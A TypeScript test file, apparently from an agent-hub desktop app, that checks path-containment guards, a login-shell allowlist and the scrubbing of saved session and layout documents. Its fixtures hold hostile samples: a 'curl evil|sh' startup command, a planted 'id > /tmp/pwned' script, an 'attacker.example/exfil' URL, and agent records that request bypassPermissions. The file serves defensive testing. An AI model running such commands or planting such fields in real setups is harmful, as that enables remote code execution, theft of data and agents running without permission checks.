      // NOT <cwd>/.claude.json, which the Go twin uses: the secret gate already
      // refuses that basename on this side, so the case would pass with the
      // item-dir half deleted and prove nothing. A directory whose name merely
      // STARTS with an item directory's is refused by nothing else.
      name: 'a sibling whose name starts with an item directory’s is not inside it',
      why:
        'dropping the separator boundary (a bare startsWith instead of containsCanonical) ' +
        'makes <cwd>/.workspacer/library-backup a member of the <cwd>/.workspacer/library ' +
        'item directory',
      plant: (home: string): string => {
        fs.writeFileSync(path.join(home, 'loot.md'), PLANTED_SECRET, 'utf-8');
        link(path.join(home, 'loot.md'), path.join(home, '.workspacer', 'library-backup', 'a.md'));
        return path.join(home, '.workspacer', 'library-backup', 'a.md');
      },
    },
    {
      name: 'an ancestor of an item directory is not inside it',
      why:
        'flipping the argument order makes every ANCESTOR of an item dir pass — and ' +
        "library.remove's sink is fs.rmSync({ recursive: true }), so the whole cwd goes",
      plant: (home: string): string => {
        fs.writeFileSync(path.join(home, 'loot.md'), PLANTED_SECRET, 'utf-8');
        link(home, path.join(home, '.claude', 'skills', 'boom'));
        return path.join(home, '.claude', 'skills', 'boom');
      },
    },
  ]) {
    itItemDirs(
      `library.list refuses a derived path outside the library directories — ${tc.name}`,
      async () => {
        const home = withFakeHome();
        const derived = tc.plant(home);

        // cwd = $HOME: accepted by the browse roots, and the widest cwd
        // library.list takes, so libraryItemRoots is at its weakest and the item
        // DIRS are the only thing left.
        call('library.list', { cwd: home });
        const guard = libraryMock.list.mock.calls[0]![1] as (p: string) => string | null;

        // 1. REFUSED.
        expect(guard(derived), `${derived} must be refused — ${tc.why}`).toBeNull();

        // 2. AND NOT LEAKED. "It errored" and "it did not leak" are different
        // claims, so drive the REAL service with the guard the handler built and
        // look for the planted bytes in what a bus caller would receive.
        const { libraryService: realLibrary } =
          await vi.importActual<typeof import('./libraryService')>('./libraryService');
        const items = realLibrary.list(home, guard);
        expect(
          JSON.stringify(items),
          'the refusal must also mean the planted bytes never reach the caller',
        ).not.toContain(PLANTED_SECRET);
      },
    );
  }

  itRanEveryGatedTest(itemDirGate, 'the library item-directory gate', 3);
});

// ── Fixture-driven sweep over every kill-switch-only path capability ────────
//
// The hand-written describes above pick their cases; this one cannot. It walks
// contracts/path-containment-cases.json's `methods` block — the same list the
// Go side and the capspec drift guard walk — and demands that EVERY method main
// serves only under the kill switch registers here and refuses an out-of-roots
// value for its declared path parameter. A method added to the fixture with
// providers: ["main-killswitch"] and no guard fails here without anyone
// remembering to write a test for it.
//
// The production twin of this loop is in hubCapabilitiesGuards.test.ts, which
// covers the providers: ["main"] entries and asserts the mirror image — that
// the methods below are ABSENT with delegation on.
interface MethodEntry {
  method: string;
  field: string;
  params: Record<string, unknown>;
  rootSet: 'workspace' | 'browse';
  /** The narrower list a method's DERIVED paths are confined to, when it has
   *  one: 'item' = [<configDir>/library, cwd]. Absent for methods that open the
   *  field they were handed. */
  derivedRootSet?: 'item';
  providers: string[];
  note?: string;
}

// src/main/services/ → five levels below the repo root, where contracts/ sits.
const fixture: {
  methods: MethodEntry[];
  checkUse: { owner: string; requirement: string; callSites?: string[] }[];
} = JSON.parse(
  fs.readFileSync(
    path.join(__dirname, '../../../../../contracts/path-containment-cases.json'),
    'utf-8',
  ),
);
const killSwitchOnly = fixture.methods.filter((m) => m.providers.includes('main-killswitch'));

describe('fixture-driven guard coverage — kill-switch-only path capabilities', () => {
  let agentCwd: string;
  let outside: string;
  let sandboxHome: string;
  const realHome = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE };
  beforeEach(() => {
    agentCwd = mkTmp('wks-guard-');
    // A real directory that is in neither root set: not a live agent cwd (so it
    // is outside `workspace`) and under the temp dir rather than home (so it is
    // outside `browse` too, which is why the browse cases use /etc instead).
    outside = mkTmp('wks-guard-outside-');
    // A HOME of our own — see homeProbe below for why the probe has to live
    // under the home tree, and why it must not be the developer's real one.
    sandboxHome = mkTmp('wks-guard-home-');
    process.env.HOME = sandboxHome;
    process.env.USERPROFILE = sandboxHome;
    getAllSnapshots.mockReturnValue([{ cwd: agentCwd }] as never);
  });

  afterEach(() => {
    process.env.HOME = realHome.HOME;
    process.env.USERPROFILE = realHome.USERPROFILE;
  });

  /**
   * The probe that separates `workspace` from `browse`.
   *
   * browse = workspace roots + os.homedir(). This sweep used to probe
   * out-of-roots with an os.tmpdir() path for `workspace` and '/etc' for
   * `browse` — os.tmpdir() is outside BOTH sets and a live agent cwd is inside
   * both, so nothing here could distinguish workspaceRoots() from browseRoots()
   * and the fixture's `rootSet` column was decorative. Six methods could be
   * widened to the whole home tree with 951/951 desktop tests and all 19 Go
   * packages green.
   *
   * A path under the sandbox home that is nobody's cwd is inside `browse` and
   * outside `workspace`, by construction. The home is sandboxed because the
   * sweep drives the real handlers, so a widened fs.write LANDS a file in
   * whatever home it is pointed at — which is how the Go twin of this sweep
   * disarmed itself: it probed a fixed name in the real $HOME and skipped when
   * that name existed, and its own fs.write subtest created it.
   */
  function homeProbe(): string {
    expect(os.homedir()).toBe(sandboxHome);
    const probe = path.join(sandboxHome, 'wks-contract-probe-not-an-agent-cwd');
    // Never a skip on collision: "I could not run" must not read as "I passed".
    expect(fs.existsSync(probe)).toBe(false);
    return probe;
  }

  /** A SIBLING of the sandbox home: inside `dirname($HOME)`, outside `$HOME`,
   *  nobody's cwd and no config store. The upper boundary probe for `browse`. */
  function homeSiblingProbe(): string {
    expect(os.homedir()).toBe(sandboxHome);
    const probe = path.join(path.dirname(sandboxHome), 'wks-contract-probe-sibling-of-home');
    expect(fs.existsSync(probe)).toBe(false);
    return probe;
  }

  /** Run a capability and return the error message it produced, or '' for none.
   *  Handlers guard both synchronously and inside an async body, so both shapes
   *  have to be collapsed before the message can be matched. */
  async function attempt(method: string, params: unknown): Promise<string> {
    try {
      await call(method, params);
      return '';
    } catch (err) {
      return (err as Error).message;
    }
  }

  it('the fixture lists methods this owner serves', () => {
    // A fixture that stopped naming 'main-killswitch' would silently turn every
    // assertion below into zero assertions.
    expect(killSwitchOnly.length).toBeGreaterThan(0);
  });

  const killSweep = new SweepTally();
  for (const entry of killSwitchOnly) {
    describe(entry.method, () => {
      it('is registered when the kill switch is on', () => {
        killSweep.ran('other');
        expect(registered.has(entry.method)).toBe(true);
      });

      it(`denies a ${entry.field} outside the ${entry.rootSet} roots`, async () => {
        // `browse` reaches the whole home tree, so the out-of-roots value has to
        // come from outside it entirely.
        const target = entry.rootSet === 'browse' ? '/etc' : outside;
        const msg = await attempt(entry.method, { ...entry.params, [entry.field]: target });
        expect(msg).toMatch(/outside the allowed workspace/);

        // The UPPER boundary of `browse`, which nothing probed. Both deny values
        // above are outside $HOME's PARENT too, so widening browseRoots() to
        // `path.dirname(os.homedir())` — every other user's home — changed no
        // assertion in either sweep while fs.listDir enumerated a stranger's
        // home and library.list handed back the bodies of its library items.
        const sibMsg = await attempt(entry.method, {
          ...entry.params,
          [entry.field]: homeSiblingProbe(),
        });
        expect(sibMsg, 'neither root set reaches outside the home tree').toMatch(
          /outside the allowed workspace/,
        );
      });

      it(`allows a ${entry.field} inside a live agent cwd`, async () => {
        // A live agent cwd is in both root sets, so one value serves either.
        const msg = await attempt(entry.method, { ...entry.params, [entry.field]: agentCwd });
        expect(msg).not.toMatch(/outside the allowed workspace/);
      });

      it(`consults the ${entry.rootSet} roots and not the other set`, async () => {
        const msg = await attempt(entry.method, { ...entry.params, [entry.field]: homeProbe() });
        if (entry.rootSet === 'browse') {
          expect(msg).not.toMatch(/outside the allowed workspace/);
        } else {
          expect(msg).toMatch(/outside the allowed workspace/);
        }
      });
    });
  }

  // derivedRootSet is the SECOND allow-list: library.* confine the caller's cwd
  // against `rootSet` and then confine every path DERIVED from it against
  // [<configDir>/library, cwd] — strictly narrower than either root set, because
  // a library item may only live in the global store or the project the caller
  // named. Conflating the two is what the brain did (it used the WORKSPACE roots
  // for the derived write), so one library.save with a
  // `<projA>/.workspacer/library -> <projB>` symlink wrote into a second agent's
  // project and into <configDir>/sessions there and was refused here. This pins
  // the side that was already right, so the two cannot re-diverge in either
  // direction. The Go half is TestLibraryDerivedRootSetIsTheItemRoots.
  // The filter is a place this sweep can silently become zero tests: a fixture
  // that renamed `derivedRootSet` or its value would register nothing here and
  // the file would still be green. Assert the selection before using it.
  const derivedItemMethods = killSwitchOnly.filter((m) => m.derivedRootSet === 'item');
  it('[floor] the fixture still names methods whose derived guard uses the item roots', () => {
    expect(
      derivedItemMethods.map((m) => m.method),
      "no methods carry derivedRootSet 'item' — this sweep just became zero tests",
    ).not.toEqual([]);
  });

  const derivedSweep = new SweepTally();
  for (const entry of derivedItemMethods) {
    it(`${entry.method}'s per-file guard uses the item roots, not the ${entry.rootSet} roots`, () => {
      derivedSweep.ran('other');
      const secondAgentCwd = mkTmp('wks-projB-');
      getAllSnapshots.mockReturnValue([{ cwd: agentCwd }, { cwd: secondAgentCwd }] as never);
      const mock = (libraryMock as unknown as Record<string, { mock: { calls: unknown[][] } }>)[
        entry.method.split('.')[1]
      ];
      call(entry.method, { ...entry.params, cwd: agentCwd });
      const guard = guardArgOf(mock.mock.calls[0]);
      // Both cwds are live agents, so both are inside the workspace roots. Only
      // the one the caller named is inside the item roots.
      expect(guard(path.join(secondAgentCwd, 'pwn.md'))).toBeNull();
      expect(guard(path.join(cfg.dir, 'sessions', 'pwn.md'))).toBeNull();
      expect(guard(path.join(cfg.dir, 'layouts', 'pwn.md'))).toBeNull();
      // …while the two places an item legitimately lives still pass.
      const inProject = path.join(agentCwd, '.workspacer', 'library', 'ok.md');
      expect(guard(inProject)).toBe(inProject);
      const inStore = path.join(cfg.dir, 'library', 'ok.md');
      expect(guard(inStore)).toBe(inStore);
    });
  }

  // BINDING DECISION 1 at the HANDLERS. The corpus's six tilde cases all call
  // the PREDICATE, so they pin only that canonicalizePath treats '~' as an
  // ordinary name; nothing pinned that a handler hands the predicate the
  // caller's string UNMODIFIED, and the fixture's own prose names that layer as
  // the hazard ("the brain used to expandTilde() every guarded path while
  // TypeScript did not"). A tilde pre-pass inserted at any of these handlers
  // survived the whole suite: under it `fs.listDir({path:'~'})` returned the
  // $HOME listing and `library.list({cwd:'~'})` returned the BODIES of
  // $HOME/.claude/{skills,agents,commands}/*.md.
  //
  // $HOME is pointed at the live agent cwd so the expanded form is inside BOTH
  // root sets — otherwise a `workspace`-rootSet method refuses the expansion for
  // the wrong reason and the mutant survives. An agent whose cwd IS $HOME is
  // what a bare `agents.spawn({})` produces.
  //
  // TWIN: the same sweep over the providers:["main"] entries in
  // hubCapabilitiesGuards.test.ts.
  const tildeSweep = new SweepTally();
  for (const entry of killSwitchOnly) {
    it(`${entry.method} does not expand '~' before the guard sees it`, async () => {
      tildeSweep.ran('other');
      const saved = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE };
      process.env.HOME = agentCwd;
      process.env.USERPROFILE = agentCwd;
      try {
        expect(os.homedir(), 'the probe needs $HOME to be an allowed root').toBe(agentCwd);
        for (const spelling of ['~', '~/notes.txt', '~/']) {
          const msg = await attempt(entry.method, { ...entry.params, [entry.field]: spelling });
          expect(
            msg,
            `${entry.method} accepted ${JSON.stringify(spelling)} — '~' is an ordinary filename here, so a '~'-prefixed path is not absolute and must be refused (BINDING DECISION 1)`,
          ).toMatch(/outside the allowed workspace/);
        }
      } finally {
        process.env.HOME = saved.HOME;
        process.env.USERPROFILE = saved.USERPROFILE;
      }
    });
  }

  // Ratcheted to the sizes the fixture carries today. Both `.length > 0` checks
  // above read the FIXTURE; these read the run.
  itSweptTheWholeCorpus(
    tildeSweep,
    'the no-tilde-expansion sweep over the kill-switch methods',
    7,
    {
      allow: 0,
      deny: 0,
    },
  );
  itSweptTheWholeCorpus(killSweep, 'the kill-switch-owned method sweep', 7, {
    allow: 0,
    deny: 0,
  });
  itSweptTheWholeCorpus(derivedSweep, "the derivedRootSet 'item' sweep", 3, {
    allow: 0,
    deny: 0,
  });
});

/**
 * terminals.create's `shell` is argv[0] of a process spawned on the host, taken
 * verbatim from a bus caller. capspec leaves the capability unscoped and its
 * recorded reason named ONE param (`cwd`); nothing checked the other one in
 * either provider. Pair it with an fs.write over an existing executable inside
 * the caller's own agent cwd — writeFileSync preserves the 0755 — and
 * terminals.create alone was arbitrary host code execution.
 *
 * TWIN: TestTerminalsCreateRefusesAShellThatIsNotOne in the Go brain.
 */
describe('terminals.create — shell is an allowlist, not a passthrough', () => {
  const realEtcShells = shellConfig.etcShellsPath;
  const realShell = process.env.SHELL;
  let sandbox: string;

  beforeEach(() => {
    sandbox = mkTmp('wks-term-');
    shellConfig.etcShellsPath = path.join(sandbox, 'shells');
    fs.writeFileSync(shellConfig.etcShellsPath, '/bin/bash\n');
    process.env.SHELL = '/bin/zsh';
    clientMock.spawn.mockClear();
  });
  afterEach(() => {
    shellConfig.etcShellsPath = realEtcShells;
    if (realShell === undefined) delete process.env.SHELL;
    else process.env.SHELL = realShell;
    fs.rmSync(sandbox, { recursive: true, force: true });
  });

  it('refuses an arbitrary executable, before any spawn is attempted', async () => {
    const planted = path.join(sandbox, 'node_modules', '.bin', 'tsc');
    fs.mkdirSync(path.dirname(planted), { recursive: true });
    fs.writeFileSync(planted, '#!/bin/sh\nid > /tmp/pwned\n', { mode: 0o755 });

    await expect(
      call('terminals.create', { shell: planted, cwd: sandbox }) as Promise<unknown>,
    ).rejects.toThrow(/login shells/);
    expect(clientMock.spawn).not.toHaveBeenCalled();
  });

  it('still spawns a real login shell, and defaults when none is named', async () => {
    await call('terminals.create', { shell: '/bin/zsh', cwd: sandbox });
    expect(clientMock.spawn).toHaveBeenCalledWith(expect.objectContaining({ argv: ['/bin/zsh'] }));

    clientMock.spawn.mockClear();
    await call('terminals.create', { cwd: sandbox });
    expect(clientMock.spawn).toHaveBeenCalledWith(expect.objectContaining({ argv: ['/bin/zsh'] }));
  });
});

/**
 * workspaceRoots() is the allow-list every workspace-confined capability uses —
 * fs.read / fs.write / fs.listEntries / fs.readImage / fs.watch / fs.unwatch /
 * search.project / all ten git.* / library.save / library.remove / replay.open —
 * so its MEMBERSHIP is the security boundary and has to be pinned in both
 * directions.
 *
 * It was pinned in neither. Adding one line (`roots.add(process.cwd())`) and
 * deleting one line (the configStoreRoots loop) each left 84 files / 1213 tests
 * green. Neither fixture-driven sweep can see it: they probe {agent cwd},
 * {os.tmpdir() sibling}, {$HOME}, {$HOME sibling} — none of which is
 * process.cwd() — and the one test that touches a config store sets
 * `agentCwd = path.dirname(cfg.dir)`, so the store is inside the agent cwd
 * anyway and the configStoreRoots leg is never required.
 */
describe('what workspaceRoots() is made of', () => {
  let agentCwd: string;
  beforeEach(() => {
    agentCwd = mkTmp('wks-roots-');
    getAllSnapshots.mockReturnValue([{ cwd: agentCwd }] as never);
  });

  it('does not grant the desktop process its OWN working directory', () => {
    // For a packaged Electron main, process.cwd() is wherever the app was
    // launched from — routinely $HOME, and on a macOS Dock launch, '/'.
    const probe = path.join(fs.realpathSync(process.cwd()), 'wks-not-an-agent-cwd.txt');
    expect(
      () => call('fs.read', { path: probe }),
      "fs.read of a file under the desktop process's own cwd was ALLOWED",
    ).toThrow(/outside the allowed workspace/);
    expect(readTextFile).not.toHaveBeenCalled();
  });

  it('keeps the config stores in, with NO agent running', () => {
    // No live agents at all, so the only thing that can admit these is the
    // configStoreRoots leg. The web/remote UI reads and writes its own
    // library/layouts/sessions this way.
    getAllSnapshots.mockReturnValue([] as never);
    for (const store of ['library', 'layouts', 'sessions']) {
      const item = path.join(cfg.dir, store, 'entry.yaml');
      expect(() => call('fs.read', { path: item }), store).not.toThrow();
    }
    expect(readTextFile).toHaveBeenCalledTimes(3);
  });

  it('does not grant the rest of the config dir along with them', () => {
    getAllSnapshots.mockReturnValue([] as never);
    for (const rel of ['remote-token', 'config.yaml', path.join('plugins', 'p', 'manifest.json')]) {
      expect(() => call('fs.read', { path: path.join(cfg.dir, rel) }), rel).toThrow(
        /outside the allowed workspace/,
      );
    }
  });
});

/**
 * guardLibraryCwd's absent-cwd posture. With no `cwd`, the guard returns
 * undefined, so libraryItemRoots is just `[<configDir>/library]` — and
 * libraryService's own internal `input.cwd || process.cwd()` fallback then
 * composes a project destination the PER-FILE guard refuses. That pairing is
 * deliberate and fail-closed, and nothing exercised it: `if (!cwd) return
 * process.cwd();` left the whole suite green while turning the app's working
 * directory into a writable and deletable library root.
 */
describe('library.list — the optional kind/id filters', () => {
  // The filters exist because an unfiltered listing carries every item's full
  // BODY: learning ONE dispatch template's placeholders used to cost a manager
  // the whole library. They narrow the ANSWER, never the read — the same files
  // are opened under the same per-file guard — so they can only remove rows the
  // caller was already entitled to.
  beforeEach(() => {
    getAllSnapshots.mockReturnValue([] as never);
  });

  it('forwards kind and id to the service as a filter', () => {
    call('library.list', { kind: 'dispatch', id: 'ship-task' });
    const [, , filter] = libraryMock.list.mock.calls.at(-1) as [
      unknown,
      unknown,
      { kind?: string; id?: string },
    ];
    expect(filter).toEqual({ kind: 'dispatch', id: 'ship-task' });
  });

  it("an omitted filter stays undefined — existing callers get today's answer", () => {
    call('library.list', {});
    const [, , filter] = libraryMock.list.mock.calls.at(-1) as [
      unknown,
      unknown,
      { kind?: string; id?: string },
    ];
    expect(filter).toEqual({ kind: undefined, id: undefined });
  });

  it('the SAME per-file guard is handed over whether or not a filter is passed', () => {
    call('library.list', {});
    const [, unfiltered] = libraryMock.list.mock.calls.at(-1) as [unknown, unknown];
    call('library.list', { kind: 'dispatch' });
    const [, filtered] = libraryMock.list.mock.calls.at(-1) as [unknown, unknown];
    // Not the same function object (it is built per call), but the same shape of
    // confinement: a filter must never be a door into a wider read.
    expect(typeof unfiltered).toBe('function');
    expect(typeof filtered).toBe('function');
  });

  it('an empty string is "no filter", matching the Go twin\'s omitempty', () => {
    // The facade's Go structs are `omitempty`, so an omitted field arrives as
    // "". Refusing it here would make the same call succeed on the brain and
    // fail on the desktop.
    expect(() => call('library.list', { kind: '', id: '' })).not.toThrow();
    const [, , filter] = libraryMock.list.mock.calls.at(-1) as [
      unknown,
      unknown,
      { kind?: string; id?: string },
    ];
    expect(filter).toEqual({ kind: undefined, id: undefined });
  });

  it('an unknown kind is REFUSED, not answered with an empty list', () => {
    // A typo'd "dispatchh" that comes back [] reads as "this library holds no
    // dispatch templates", which is the wrong thing for a manager to learn.
    expect(() => call('library.list', { kind: 'dispatchh' })).toThrow(/unknown kind/);
  });

  it('every real kind is accepted', () => {
    for (const kind of ['prompt', 'skill', 'agent', 'mcp', 'command', 'dispatch']) {
      expect(() => call('library.list', { kind })).not.toThrow();
    }
  });
});

describe('library.* with no cwd at all', () => {
  beforeEach(() => {
    getAllSnapshots.mockReturnValue([] as never);
  });

  it('passes NO cwd through to the service rather than substituting one', () => {
    call('library.save', { scope: 'project', title: 't', kind: 'prompt', body: 'b' });
    expect(libraryMock.save).toHaveBeenCalledTimes(1);
    const [input] = libraryMock.save.mock.calls[0] as [{ cwd?: string }];
    expect(
      input.cwd,
      'a missing cwd was replaced with a real directory — that directory becomes a library item root',
    ).toBeUndefined();
  });

  it('refuses a project-scope write derived from a substituted cwd', () => {
    // The pairing made behavioural: the per-file guard the handler builds must
    // not admit anything under the process working directory.
    call('library.save', { scope: 'project', title: 't', kind: 'prompt', body: 'b' });
    const [, guard] = libraryMock.save.mock.calls[0] as [unknown, (p: string) => string | null];
    expect(typeof guard).toBe('function');
    const underProcessCwd = path.join(
      fs.realpathSync(process.cwd()),
      '.workspacer',
      'library',
      't.md',
    );
    expect(
      guard(underProcessCwd),
      'the per-file guard admitted a path under the process working directory',
    ).toBeNull();
    // Floor: the global store IS admitted, or the assertion above is satisfied
    // by a guard that refuses everything.
    expect(guard(path.join(cfg.dir, 'library', 't.md'))).not.toBeNull();
  });
});

// PROVEN, critical. sessions.save is layout.set's unscrubbed twin.
//
// internal/layout scrubs skipPermissions / permissionMode / profileId /
// mcpItemIds from every non-trusted layout.set, because those fields "STOP BEING
// DESCRIPTION on the desktop's next launch and become arguments to a spawn".
// sessions.save writes the SAME `agents` array into <configDir>/sessions/<slug>.yaml
// with a fresh timestamp — making it sessions[0] on boot — and nothing scrubbed
// it. Driving the real migrateSessionData + useAgentManager over exactly these
// bytes produced spawnClaude({cwd:'/', skipPermissions:true,
// permissionMode:'bypassPermissions', profileId:'attacker-profile',
// mcpItemIds:['evil-mcp'], resumeSessionId:'dead-session-id'}) — every one of
// which the bus's own agents.spawn refuses, from a caller that may not spawn.
//
// layouts.save is the third copy of the shape, restored from the Layouts menu
// into the same respawn path.
describe('boot-restore documents are scrubbed by every writer, not just layout.set', () => {
  const hostile = {
    id: 'a1',
    cwd: '/',
    provider: 'claude',
    sessionId: 'dead-session-id',
    skipPermissions: true,
    permissionMode: 'bypassPermissions',
    profileId: 'attacker-profile',
    mcpItemIds: ['evil-mcp'],
  };
  const escalations = ['skipPermissions', 'permissionMode', 'profileId', 'mcpItemIds'];

  beforeEach(() => {
    savedSessions.length = 0;
    savedLayouts.length = 0;
  });

  it('sessions.save strips the four spawn-escalation fields', () => {
    call('sessions.save', { name: 'restored', activeAgentId: 'a1', agents: [{ ...hostile }] });
    expect(savedSessions).toHaveLength(1);
    const doc = savedSessions[0] as { agents: Record<string, unknown>[] };
    for (const field of escalations) {
      expect(
        doc.agents[0],
        `sessions.save persisted ${field}; respawnFromRecord forwards it to window.electronAPI.spawnClaude, the LOCAL IPC door that scrubs nothing`,
      ).not.toHaveProperty(field);
    }
    // FLOOR: the record must still be a usable session.
    expect(doc.agents[0]).toMatchObject({ id: 'a1', cwd: '/', sessionId: 'dead-session-id' });
  });

  // THE PERSISTENCE DECISION, pinned (2026-08-26). A live agents.spawn now
  // honors a bypass for a host or operator-tier token — the token is the trust
  // boundary. This door deliberately did NOT move with it: A LIVE SPAWN DIES
  // WITH THE PROCESS; A PERSISTED DOCUMENT OUTLIVES THE TOKEN. Revoking a
  // credential closes its socket and reaches nothing already on disk, while
  // this document is respawned through the LOCAL IPC door — which scrubs
  // nothing and asks nobody — on every launch thereafter. So full access is
  // LIVE-ONLY, and the record SAYS it came back weaker rather than doing it
  // quietly. Changing this needs a provenance stamp that is not forgeable by
  // the same writer that plants the fields; see lib/bootDocumentScrub.ts.
  it('records WHAT it took, so a restore-time downgrade is not silent', () => {
    call('sessions.save', {
      name: 'restored',
      agents: [{ ...hostile }, { id: 'a2', cwd: '/proj', model: 'opus' }],
    });
    const doc = savedSessions[0] as { agents: Record<string, unknown>[] };
    expect(doc.agents[0].escalationScrubbed).toEqual(escalations);
    // A record that lost nothing must not claim a downgrade, or the signal
    // means nothing.
    expect(doc.agents[1]).not.toHaveProperty('escalationScrubbed');
    expect(doc.agents[1]).toMatchObject({ id: 'a2', model: 'opus' });
  });

  it('never lets the caller supply the escalationScrubbed note', () => {
    // Hub-owned, like yoloGranted: an incoming copy is deleted before the scrub
    // decides whether to add its own. Otherwise a writer could forge a
    // complaint — or a record scrubbed once would report a downgrade forever,
    // including after the write that restored it.
    call('sessions.save', {
      name: 'restored',
      agents: [{ id: 'a1', cwd: '/proj', escalationScrubbed: ['skipPermissions'] }],
    });
    const doc = savedSessions[0] as { agents: Record<string, unknown>[] };
    expect(doc.agents[0]).not.toHaveProperty('escalationScrubbed');
  });

  it('layouts.save strips them too', () => {
    call('layouts.save', { name: 'tpl', agents: [{ ...hostile }] });
    expect(savedLayouts).toHaveLength(1);
    const doc = savedLayouts[0] as { agents: Record<string, unknown>[] };
    for (const field of escalations) {
      expect(doc.agents[0]).not.toHaveProperty(field);
    }
    expect(doc.agents[0]).toMatchObject({ id: 'a1' });
  });

  it("does not mutate the caller's params object", () => {
    const params = { name: 'restored', agents: [{ ...hostile }] };
    call('sessions.save', params);
    expect(
      params.agents[0].skipPermissions,
      "the scrub rewrote an in-flight RPC's params in place — a different bug",
    ).toBe(true);
  });

  // The agent-level scrub above never reached the terminal-pane host-exec fields
  // one level down, inside agents[].tabs[].panes[]. A restored terminal pane's
  // `shell` is argv[0] of the LOCAL terminal:create door (no allowlist), and its
  // `initialCommand` is typed into the ready PTY with a trailing CR — arbitrary
  // shell text auto-run on the desktop's next launch.
  const paneHostile = {
    id: 'a1',
    cwd: '/',
    provider: 'claude',
    tabs: [
      {
        id: 't1',
        title: 'T',
        panes: [
          {
            id: 'p1',
            type: 'terminal',
            title: 'sh',
            shell: '/tmp/attacker-planted',
            initialCommand: 'curl evil|sh',
          },
        ],
      },
    ],
  };

  it('sessions.save strips per-pane host-execution fields (shell / initialCommand)', () => {
    call('sessions.save', { name: 'restored', activeAgentId: 'a1', agents: [{ ...paneHostile }] });
    const doc = savedSessions[0] as { agents: any[] };
    const pane = doc.agents[0].tabs[0].panes[0];
    expect(
      pane,
      'a restored terminal pane spawns `shell` through the LOCAL terminal:create door, which allowlists nothing',
    ).not.toHaveProperty('shell');
    expect(
      pane,
      'initialCommand is typed into the ready PTY with a CR — arbitrary shell auto-run on restore',
    ).not.toHaveProperty('initialCommand');
    // FLOOR: the pane survives as a usable terminal minus the exec sinks.
    expect(pane).toMatchObject({ id: 'p1', type: 'terminal' });
  });

  it('layouts.save strips per-pane host-execution fields too', () => {
    call('layouts.save', { name: 'tpl', agents: [{ ...paneHostile }] });
    const doc = savedLayouts[0] as { agents: any[] };
    const pane = doc.agents[0].tabs[0].panes[0];
    expect(pane).not.toHaveProperty('shell');
    expect(pane).not.toHaveProperty('initialCommand');
    expect(pane).toMatchObject({ id: 'p1' });
  });

  // A restored `plugin` pane whose `pluginId` names a loaded plugin makes
  // PluginPane MINT a live plugin-scoped bus token and splice it onto the pane's
  // `url` before loading it in the webview. A bus writer that set both
  // url:'https://attacker/x' and pluginId:'<loaded>' would have the host hand a
  // fresh authenticated capability to an attacker origin on restore. Dropping
  // `pluginId` makes the pane un-mintable (canMint === false); the url then
  // loads unauthenticated, at parity with a browser pane.
  const pluginPaneHostile = {
    id: 'a1',
    cwd: '/',
    provider: 'claude',
    tabs: [
      {
        id: 't1',
        title: 'T',
        panes: [
          {
            id: 'p1',
            type: 'plugin',
            title: 'pl',
            url: 'https://attacker.example/exfil',
            pluginId: 'djtouchette.shiplight',
            cwd: '/home/user/project',
          },
        ],
      },
    ],
  };

  it('sessions.save strips a plugin pane pluginId (the live-token mint gate)', () => {
    call('sessions.save', {
      name: 'restored',
      activeAgentId: 'a1',
      agents: [{ ...pluginPaneHostile }],
    });
    const doc = savedSessions[0] as { agents: any[] };
    const pane = doc.agents[0].tabs[0].panes[0];
    expect(
      pane,
      'a restored plugin pane mints a live plugin-scoped bus token against pluginId and splices it onto url — leaking a fresh capability to the url origin',
    ).not.toHaveProperty('pluginId');
    // FLOOR: the pane survives; url is kept (unauthenticated without the mint).
    expect(pane).toMatchObject({ id: 'p1', type: 'plugin', url: 'https://attacker.example/exfil' });
  });

  it('layouts.save strips a plugin pane pluginId too', () => {
    call('layouts.save', { name: 'tpl', agents: [{ ...pluginPaneHostile }] });
    const doc = savedLayouts[0] as { agents: any[] };
    const pane = doc.agents[0].tabs[0].panes[0];
    expect(pane).not.toHaveProperty('pluginId');
    expect(pane).toMatchObject({ id: 'p1', type: 'plugin' });
  });
});

// ---------------------------------------------------------------------------
// contracts/path-containment-cases.json → libraryItemDirs
//
// The hand-written item-directory cases above pin THIS copy. This loader pins
// it against the OTHER copy of the same call with the same cases: the brain's
// cmd/brain/library.go has had both halves of the derived-path gate since
// library.* became bus-reachable, and this side had only the roots — so a
// library.list with cwd=$HOME and a `.workspacer/library -> ~/.ssh` symlink was
// refused there and served here, and here is the copy the kill switch puts back
// on the bus. Agreement between two providers about one call is not something
// either side's own tests can see, which is what the shared fixture is for.
//
// TWIN LOADER: services/hub/cmd/brain/library_itemdirs_test.go,
// TestLibraryItemDirContractCases.
// ---------------------------------------------------------------------------
interface ItemDirCase {
  name: string;
  cwd: string;
  item: string;
  expect: 'accept' | 'refuse';
  refusedBy?: string;
  resolvesTo?: string;
  needsSymlinks?: boolean;
  tree?: {
    dirs?: string[];
    files?: Record<string, string>;
    symlinks?: Record<string, string>;
  };
  why: string;
}

const itemDirFixture: { libraryItemDirs: { cases: ItemDirCase[] } } = JSON.parse(
  fs.readFileSync(
    path.join(__dirname, '../../../../../contracts/path-containment-cases.json'),
    'utf-8',
  ),
);

describe('library item directories — cross-language contract', () => {
  const cases = itemDirFixture.libraryItemDirs.cases;
  const realHome = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE };
  const sweep = new SweepTally();
  // Derived from the fixture, so adding a case raises the floor with it. The
  // deny floor counts only the cases that are NOT host-gated: a machine without
  // symlink privilege legitimately skips the rest, and a floor that counted them
  // would go red on that host for the wrong reason.
  const wantAllow = cases.filter((c) => c.expect === 'accept').length;
  const wantDeny = cases.filter((c) => c.expect === 'refuse' && !c.needsSymlinks).length;

  beforeEach(() => {
    getAllSnapshots.mockReturnValue([] as never);
  });
  afterEach(() => {
    process.env.HOME = realHome.HOME;
    process.env.USERPROFILE = realHome.USERPROFILE;
    getConfigDirMock.mockImplementation(() => cfg.dir);
  });

  it('the fixture block loads', () => {
    expect(
      cases.length,
      'a silently empty corpus guards nothing — the block was renamed or dropped',
    ).toBeGreaterThan(0);
  });

  /**
   * Which half refused, recomputed WITHOUT calling either half: containment is
   * decided with fs.realpathSync and a plain prefix test, so a bug in the
   * confinement helpers cannot talk this oracle into agreeing with the thing it
   * is checking. TWIN: libraryItemRefusalReason in library_itemdirs_test.go.
   */
  const refusalReason = (item: string, canonicalCwd: string, configDir: string): string => {
    let real: string;
    try {
      real = fs.realpathSync(item);
    } catch {
      return 'outside-item-roots'; // unresolvable never reaches the dirs test
    }
    const under = (root: string): boolean => {
      let rr: string;
      try {
        rr = fs.realpathSync(root);
      } catch {
        return false;
      }
